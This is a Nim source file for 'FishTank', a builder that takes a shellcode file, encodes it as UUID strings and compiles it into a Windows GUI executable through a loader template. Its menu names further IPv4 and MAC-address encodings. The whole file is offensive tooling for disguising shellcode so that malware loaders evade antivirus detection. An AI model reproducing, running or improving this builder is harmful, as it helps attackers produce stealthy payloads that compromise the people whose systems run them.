#  _____ _     _   _____           _    
# |  ___(_)___| |_|_   _|_ _ _ __ | | __
# | |_  | / __| '_ \| |/ _` | '_ \| |/ /
# |  _| | \__ \ | | | | (_| | | | |   < 
# |_|   |_|___/_| |_|_|\__,_|_| |_|_|\_\
#                                       

import winim
import std/[os, strutils]
# import ptr_math
# import strformat
import obfuscation/mahimahi

proc printMenu() =
  echo """
  Usage:
    Fishtank.exe <file_path> <Shellcode Obfuscation Method>

  Arguments:
    file_path   Path to the shellcode file.
    Shellcode Obfuscation Method      FishTank.exe -h obfuscation to see supported methods.

  Options:
    -h, --help  Displays help message.
    -h obfuscation  Displays help for supported obfuscation methods
  """

proc printObfuscationMenu() =
  echo """
  Obfuscation Menu:
    Available obfuscation strings:
      - salmon :: Shellcode to UUID strings
      - tuna :: Shellcode to IPv4 strings
      - catfish :: Shellcode to MAC address strings
      - mahimahi :: Shellcode to Aquarium strings
  """

proc main() =
  let args = commandLineParams()
  if args.len == 0 or (args.len == 1 and (args[0] == "-h" or args[0] == "--help")):
    printMenu()
  elif args.len == 2 and args[0] == "-h" and args[1] == "obfuscation":
    printObfuscationMenu()
  elif args.len < 2:
    echo "Error: Not enough arguments provided."
    printMenu()
  else:
    let filePath = args[0]
    let obfuscation = args[1]
    case obfuscation:
    of "mahimahi":
      let (uuidArray, uuidCount) = binToUuids(filePath)
      let outputFilename = "compile/mahi_compile.nim"
      let outputExe = "outputs/output.exe"
      let tempFilename = outputFilename & ".temp"
      var inFile: File
      var outFile: File
      try:
          inFile = open(outputFilename, fmRead)
          outFile = open(tempFilename, fmWrite)
          
          var insideUuidSection = false
          for line in inFile.lines:
            if line.strip().startsWith("var uuidArray ="):
              insideUuidSection = true
              outFile.writeLine("var uuidArray = allocCStringArray([")
              for i in 0..<uuidCount:
                if uuidArray[i] == nil: break
                outFile.writeLine("  \"" & $uuidArray[i] & "\",")
              outFile.writeLine("])")
            elif line.strip().startsWith("var uuidCount"):
              outFile.writeLine("var uuidCount: int = " & $uuidCount)
              insideUuidSection = false
            elif not insideUuidSection:
              outFile.writeLine(line)
      finally:
          if not inFile.isNil: inFile.close()
          if not outFile.isNil: outFile.close()

      # Replace the original file with the updated one
      try:
          removeFile(outputFilename)
          moveFile(tempFilename, outputFilename)
      except:
          echo "Error replacing file: ", getCurrentExceptionMsg()
      
      let absoluteOutputFilename = absolutePath(outputFilename)
      let absoluteOutputExe = absolutePath(outputExe)
      let compileCommand = "nim c --app=gui --cpu=amd64 --out:\"" & absoluteOutputExe & "\" \"" & absoluteOutputFilename & "\""
      discard execShellCmd(compileCommand)
main()
